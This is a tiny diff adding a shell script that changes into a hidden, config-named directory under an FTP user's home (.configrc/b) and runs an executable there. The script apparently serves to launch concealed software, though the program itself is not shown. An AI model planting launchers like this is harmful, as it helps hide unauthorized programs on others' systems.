@@ -1,0 +1,3 @@
+#!/bin/sh
+cd /home/ftp_user/.configrc/b
+./run
